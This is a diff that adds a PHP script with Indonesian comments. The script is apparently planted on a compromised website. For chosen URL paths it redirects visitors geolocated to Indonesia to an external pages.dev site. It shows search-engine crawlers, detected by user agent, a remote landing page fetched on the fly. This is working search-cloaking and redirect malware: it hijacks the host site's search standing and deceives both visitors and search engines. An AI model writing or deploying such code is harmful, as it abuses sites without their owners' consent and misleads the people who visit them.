@@ -1,0 +1,55 @@
+<?php
+
+function mangsud($url) {
+    if (ini_get('allow_url_fopen')) {
+        return @file_get_contents($url);
+    } elseif (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        $res = curl_exec($ch);
+        curl_close($ch);
+        return $res;
+    }
+    return false;
+}
+
+$ua  = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+
+$bot_regex = "/(googlebot|google|adsbot|mediapartners|bingbot|slurp|yandex|duckduck|baidu|ahrefs|semrush|mj12|dotbot|crawler|spider|facebook|twitterbot|telegrambot)/i";
+
+// LP untuk bot
+$remote_lp = "https://lp-commissioning-applyingforcxacertification.pages.dev/";
+// AMP untuk IP Indonesia langsung redirect aja
+$amp = "https://commissioning-applyingforcxacertification.pages.dev/ts99-v1";
+
+// ------- match multiple path -------
+$match_paths = [
+    "/applyingforcxacertification/",
+    "/applyingforcxacertification/",
+    "/applyingforcxacertification/",
+];
+// tinggal tambah sendiri ya bro, misalnya:
+// "/applyingforcxacertification/",
+// "/applyingforcxacertification/",
+
+if (in_array($uri, $match_paths, true)) {
+
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+    $geo = @json_decode(@file_get_contents("http://ip-api.com/json/$ip"), true);
+
+    if (!empty($geo['countryCode']) && $geo['countryCode'] === "ID") {
+        header("Location: $amp");
+        exit;
+    }
+
+    if (preg_match($bot_regex, $ua)) {
+        $f = mangsud($remote_lp);
+        echo $f ?: "";
+        exit;
+    }
+}
+
+?>
